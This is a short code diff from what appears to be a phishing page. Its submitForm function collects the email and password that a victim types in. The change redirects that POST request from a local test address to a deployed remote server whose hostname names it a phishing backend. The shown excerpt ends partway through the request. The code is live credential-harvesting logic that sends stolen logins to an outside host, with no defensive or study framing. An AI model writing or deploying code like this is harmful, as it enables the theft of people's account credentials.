@@ -229,7 +229,7 @@ function submitForm() {
   const email = document.getElementById('email').value;
   const password = document.getElementById('password').value;
 
-  fetch("https://localhost:7011/api/log", {
+  fetch("https://phishing-backend-production-f1aa.up.railway.app/api/log", {
     method: "POST",
     headers: {
       "Content-Type": "application/json"
